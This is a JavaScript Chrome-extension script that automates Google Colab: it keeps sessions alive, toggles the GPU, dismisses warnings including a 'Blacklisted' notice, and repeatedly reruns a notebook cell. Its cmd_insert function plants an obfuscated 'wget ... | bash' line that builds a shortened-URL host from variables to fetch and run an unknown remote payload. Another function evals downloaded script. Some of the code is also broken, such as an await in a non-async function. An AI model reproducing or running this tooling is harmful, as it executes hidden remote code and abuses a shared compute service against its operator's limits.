// simulate(document.getElementById("btn"), "click", { pointerX: 123, pointerY: 321 })
// simulate(document.getElementById("btn"), "click");

function simulate(element, eventName) {
    var options = extend(defaultOptions, arguments[2] || {});
    var oEvent, eventType = null;

    for (var name in eventMatchers) {
        if (eventMatchers[name].test(eventName)) { eventType = name; break; }
    }

    if (!eventType)
        throw new SyntaxError('Only HTMLEvents and MouseEvents interfaces are supported');

    if (document.createEvent) {
        oEvent = document.createEvent(eventType);
        if (eventType == 'HTMLEvents') {
            oEvent.initEvent(eventName, options.bubbles, options.cancelable);
        } else {
            oEvent.initMouseEvent(eventName, options.bubbles, options.cancelable, document.defaultView,
                options.button, options.pointerX, options.pointerY, options.pointerX, options.pointerY,
                options.ctrlKey, options.altKey, options.shiftKey, options.metaKey, options.button, element);
        }
        element.dispatchEvent(oEvent);
    } else {
        options.clientX = options.pointerX;
        options.clientY = options.pointerY;
        var evt = document.createEventObject();
        oEvent = extend(evt, options);
        element.fireEvent('on' + eventName, oEvent);
    }
    return element;
}

function extend(destination, source) {
    for (var property in source)
        destination[property] = source[property];
    return destination;
}

var eventMatchers = {
    'HTMLEvents': /^(?:load|unload|abort|error|select|change|submit|reset|focus|blur|resize|scroll)$/,
    'MouseEvents': /^(?:click|dblclick|mouse(?:down|up|over|move|out))$/
}
var defaultOptions = {
    pointerX: 0,
    pointerY: 0,
    button: 0,
    ctrlKey: false,
    altKey: false,
    shiftKey: false,
    metaKey: false,
    bubbles: true,
    cancelable: true
}

async function loadScript(url = 'https://code.jquery.com/jquery-3.6.0.min.js') {
    let response = await fetch(url);
    let script = await response.text();
    eval(script);
}

function jqueryImport() {
    let scriptUrl = 'https://code.jquery.com/jquery-3.6.0.min.js'

    loadScript(scriptUrl);

}

// Credit to https://medium.com/@shivamrawat_756/how-to-prevent-google-colab-from-disconnecting-717b88a128c0
function clickConnect() {
    try {
        document.querySelector("#top-toolbar > colab-connect-button").shadowRoot.querySelector("#connect").click();
        // this also works, if above one doesn't work, comment it and uncomment below one
        //document.querySelector("colab-connect-button").shadowRoot.getElementById('connect').click();
        setTimeout(clickDismiss, 2000);
        console.log("Keeping Colab Alive!");
    } catch (error) {
        console.log(error);
    }
}

function clickConnectSmart() {
    console.log("SmartConnect at" + Date());
    try {

        if (document.querySelector("#top-toolbar > colab-connect-button").shadowRoot.querySelector("#connect").textContent.match("onne")) {
            document.querySelector("#top-toolbar > colab-connect-button").
            shadowRoot.querySelector("#connect").click();
            console.log("Pressing connet")
        } else if (document.querySelector("#top-toolbar > colab-connect-button").shadowRoot.querySelector("#connect").innerHTML.match("RAM")) {
            console.log("seem already connected")
        } else {
            document.querySelector("#top-toolbar > colab-connect-button").
            shadowRoot.querySelector("#connect").click();
            console.log("Pressing connet")
        }

        try {
            document.querySelector(" colab-tab-layout-container > colab-tab-pane").
            className = "layout vertical focused hidden"

        } catch (error) {
            console.log(error);
        }
    } catch (error) {
        console.log(error);
    }
}

function clickDismiss() {
    console.log("clickDismiss at" + Date());
    try {
        document.querySelector('colab-sessions-dialog').shadowRoot.querySelector('.dismiss').click();
        console.log('clicked on dismiss button');
    } catch (error) {
        console.log(error);
    }
}


function run_cmd() {
    console.log("run_cmd at" + Date());
    try {
        let getExTitle = document.querySelector("div > colab-run-button").title;
        console.log(getExTitle)
        if (getExTitle.match("Enter") != null) {
            console.log("Click run ...")
            document.querySelector("div > colab-run-button").click()
        } else {
            console.log("seem already runing")
        }
    } catch (error) {
        console.log(error);
    }
}

function run_cmd2() {
    console.log("run_cmd v2 at" + Date());
    try {
        var getExTitle = document.querySelector("div > colab-run-button").getInnerHTML();
        console.log(getExTitle);
        if (getExTitle.match("running") == null) {
            console.log("Click run ...")
            document.querySelector("div > colab-run-button").click()
        } else {
            console.log("seem already runing")
        }
    } catch (error) {
        console.log(error);
    }
}

function stop_cmd() {
    console.log("stop_cmd v2 at" + Date());
    try {
        let getExTitle = document.querySelector("div > colab-run-button").title;
        getExTitle = document.querySelector("div > colab-run-button").getInnerHTML();
        console.log(getExTitle)
            //if (getExTitle.match("Enter") == null) {
        if (getExTitle.match("running") != null) {
            console.log("stoping")
            document.querySelector("div > colab-run-button").click()
        } else {
            console.log("alrady stoped")
        }
    } catch (error) {
        console.log(error);
    }
}

async function enable_gpu() {
    console.log("enable_gpu at" + Date());
    try {
        document.querySelector('[command="notebook-settings"]').click()
        document.querySelector('#accelerator').options.selectedIndex = 0 //cpu
        document.querySelector('#accelerator').options.selectedIndex = 1 //gpu
        await sleep(200);
        document.querySelector("#ok").click()
    } catch (error) {
        console.log(error);
    }

}

async function enable_gpu_plus() {
    console.log("enable_gpu_plus at" + Date());

    enable_gpu();
    await sleep(200);

    run_force();
    await sleep(2000);

    setTimeout(() => {
        if (document.querySelector("#ok").textContent.match("GPU") != null) {
            console.log("No more GPU");
            disable_gpu();
            return false;
        }
    }, 5000)
}


function disable_gpu() {
    console.log("disable_gpu at" + Date());


    try {
        document.querySelector('[command="notebook-settings"]').click()
        document.querySelector('#accelerator').options.selectedIndex = 1 //cpu
        document.querySelector('#accelerator').options.selectedIndex = 0 //gpu
        await sleep(200);
        document.querySelector("#ok").click()
    } catch (error) {
        console.log(error);
    }
}

function check_ok() {
    console.log("check_ok at" + Date());
    try {
        if (document.querySelector("#ok") == null) {
            console.log("no ok ...");
            return false;
        } else if (document.querySelector("#ok").textContent.match("GPU") != null) {
            console.log("No more GPU");
            return "noGPU";
        } else if (document.querySelector("#ok").parentElement.parentElement.textContent.match("err") != null) {
            console.log("backend error");
            return "errbackend";
        } else if (document.querySelector("#ok").parentElement.parentElement.textContent.match("ble") != null) {
            console.log("Blacklisted")
            return "blacklisted";
        } else {
            console.log("already_working")
            return "okbox";
        }
    } catch (error) {
        console.log(error);
    }
}

async function check_status() {
    console.log("check_status at" + Date());
    let status = {
        gid: get_gid(),
        cmd: null,
        ok: false,
        ok_type: null,
        connected: null,
        runing_cmd: null,
        info: null,
        is_gpu: false,
        time_exec: null

    }

    try {
        try {
            status.cmd = document.querySelector("div.codecell-input-output span").textContent;
        } catch (error) {
            console.log(error);
        }
        try {
            document.querySelector('[command="notebook-settings"]').click()
            if (document.querySelector('#accelerator').options.selectedIndex == 1) //gpu
            { status.is_gpu = true; } else { status.is_gpu = false; }
            await sleep(200);
            if (document.querySelector("#ok")) { document.querySelector("#ok").click() } else if (document.querySelector('.dismiss')) { document.querySelector('.dismiss').click() }
            await sleep(300);
            if (document.querySelector("#ok")) { document.querySelector("#ok").click() } else if (document.querySelector('.dismiss')) { document.querySelector('.dismiss').click() }

            dismiss_all();
        } catch (error) {
            try {
                dismiss_all();
                if (document.querySelector('.dismiss')) { document.querySelector('.dismiss').click() } else if (document.querySelector("#ok")) { document.querySelector("#ok").click() }
                if (document.querySelector('.dismiss')) { document.querySelector('.dismiss').click() } else if (document.querySelector("#ok")) { document.querySelector("#ok").click() }
                document.querySelector("#ok").click();
                cleaner_plus();
            } catch (error) { console.log("double error") };
            console.log(error);
        }
        if (document.querySelector(
                "div.output-iframe-container colab-static-output-renderer > div:nth-child(1) > div > pre")) {
            try {
                status.info = JSON.parse(document.querySelector(
                    "div.output-iframe-container colab-static-output-renderer > div:nth-child(1) > div > pre").textContent + '"}');

            } catch (error) {
                status.info = null;
                console.log(error);
            }
        }

        if (document.querySelector("#top-toolbar > colab-connect-button").shadowRoot.querySelector("#connect").textContent.match("onne")) {
            status.connected = false;
        } else if (document.querySelector("#top-toolbar > colab-connect-button").shadowRoot.querySelector("#connect").innerHTML.match("RAM")) {
            console.log("runing")
            status.connected = true;

        } else {
            document.querySelector("#top-toolbar > colab-connect-button").
            status.connected = false;

        }

        if (document.querySelector("colab-status-bar").shadowRoot.querySelector("div > button")) {
            status.time_exec = document.querySelector(" colab-status-bar").
            shadowRoot.querySelector("div > button").textContent.match(/(?<=\().+?(?=\))/g)[0]
        }
        if (document.querySelector("#ok") == null) {
            console.log("no ok ...")
            status.ok = false;
        } else {
            console.log("ok found")
            status.ok = true;
            status.ok_type = check_ok();
        }

    } catch (error) {
        console.log(error);
    }
    return status;
}



function cmd_insert(cmd = '!i=001;cmd=pysi;x=ly;y=bit;wget -q -O - ${y}.${x}/${cmd}${i} | bash') {

    try {
        if (document.querySelector("div.codecell-input-output  span > span") == null) {
            document.querySelector("#toolbar-add-code").click()
            console.log("new cmd ...")
        } else {
            console.log("cmd exist inserting code...")
            document.querySelector("div.codecell-input-output  span > span").textContent = cmd
        }
    } catch (error) {
        console.log(error);
    }
}

function get_gid() {
    console.log("get_gid at" + Date());
    try {
        return document.querySelector("#gb   div.gb_nb").textContent
    } catch (error) {
        console.log(error);
        return null;
    }
}

function run_force() {
    console.log("run_force at" + Date());

    try {
        if (document.querySelector("div.codecell-input-output span").textContent.match('wget')) {
            run_cmd2();
        }
    } catch (error) {
        console.log(error);
    }


}

function ok_cleaner() {
    console.log("ok_cleaner");
    try {
        for (var i = 0; i < 20; i++) {
            if (document.querySelector("#ok")) {
                console.log("ok press:" + i);
                document.querySelector("#ok").click();
            }
        }
        dismiss_all();
        colab_dialog_close();
    } catch (error) {
        console.log("ok click error")
        dismiss_all();
        colab_dialog_close();

    }
}

function dismiss_all() {
    console.log("dismiss_all at" + Date());

    try {

        for (var i = 0; i < 20; i++) {
            if (document.querySelector('.dismiss')) {

                document.querySelector('.dismiss').click()

            }
        }
        colab_dialog_close()
    } catch (error) {
        console.log("ok click error")
        if (document.querySelector('.dismiss')) { document.querySelector('.dismiss').click() }

    }
}

function kill_all_session() {
    console.log("kill_all_session at" + Date());

    try {
        document.querySelector('[command="manage-sessions"]').click()


    } catch (error) {
        console.log("error kill all session")
    }
}

function kill_this_session() {
    console.log("kill_this_session at" + Date());
}

function resetGPU(s) {
    console.log("resetGPU at" + Date());

    if (s.info.gpu_type == "NULL") {
        console.log("No gpu")
        return "false"
    } else if (s.info.gpu_type == "K80") {
        stop_cmd();
        enable_gpu();
        kill_this_session();
        ok_cleaner();
        dismiss_all();
        console.log("K80 GPU")
        return true

    }

    //kill_all_session();



}

function colab_dialog_close() {
    console.log("colab_dialog_close at" + Date());

    for (var i = 0; i < 20; i++) {
        if (document.querySelector("colab-dialog")) {
            document.querySelector("colab-dialog").close()
        }
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function cleaner_plus2(iteratorJ = 7) {
    console.log("cleaner2222 +++++++++++++++ at" + Date());

    for (let i = 1; i < iteratorJ; i++) {
        await sleep(500);
        ok_cleaner();
        dismiss_all();
        colab_dialog_close();
    }
}

function cleaner_plus() {
    console.log("cleaner +++++++++++++++ at" + Date());


    setTimeout(ok_cleaner(), 500);
    setTimeout(ok_cleaner(), 500);
    setTimeout(ok_cleaner(), 500);
    setTimeout(ok_cleaner(), 500);
    setTimeout(ok_cleaner(), 500);

    setTimeout(dismiss_all(), 500);
    setTimeout(dismiss_all(), 500);
    setTimeout(dismiss_all(), 500);
    setTimeout(dismiss_all(), 500);
    setTimeout(dismiss_all(), 500);

    setTimeout(colab_dialog_close(), 500);
    setTimeout(colab_dialog_close(), 500);
    setTimeout(colab_dialog_close(), 500);
    setTimeout(colab_dialog_close(), 500);
    setTimeout(colab_dialog_close(), 500);
    setTimeout(colab_dialog_close(), 500);
    setTimeout(colab_dialog_close(), 500);
    setTimeout(colab_dialog_close(), 500);
    setTimeout(colab_dialog_close(), 500);
    setTimeout(colab_dialog_close(), 500);
}

function reload_colab() {
    if (navigator.onLine) {
        window.location = window.location.href.split("#")[0];
    }
}

chrome.extension.sendMessage({}, function(response) {
    //

    //jqueryImport();
    //jqueryImport();
    //$.noConflict();

    //setTimeout( $.noConflict(), 1000);
    //jQuery(document).ready(function ($) {
    // Code that uses jQuery's $ can follow here.
    if (window.location.href.match('drive')) {

        var colabStatus = {}

        if (document.readyState === "complete") {
            setTimeout(() => {
                setTimeout(enable_gpu(), 3000)
                var readyStateCheckInterval = setInterval(function() {



                    colabStatus = check_status()
                        // ----------------------------------------------------------
                        // This part of the script triggers when page is done loading
                    console.log("status :" + colabStatus.cmd);

                    ok_cleaner();

                    if (colabStatus.info.gpu_type == "NONE" && colabStatus.is_gpu) {
                        disable_gpu();
                    } else if (colabStatus.info.gpu_type == "K80" && colabStatus.is_gpu) {
                        disable_gpu();
                    }

                    // ----------------------------------------------------------
                    //setInterval(()=>{status=check_status}, 20000);	//1 minute
                    //setInterval(clickConnect, 20000);	//20 sec


                }, 20000);
                var SmartConnect = setInterval(clickConnectSmart(), 40000);
                var RunningStatus = setInterval(run_force(), 40000);
                var OkStatus = setInterval(cleaner_plus2(), 1200000);
                var StopingStatus = setInterval(stop_cmd(), 2400000);
                var dismissStatus = setInterval(dismiss_all(), 600000);
                var testgpu = setInterval(enable_gpu(), 14400000)
                    //var reloadpage = setInterval(reload_colab(), Math.floor(Math.random() * 700))



            }, 50000);

        }
    }
});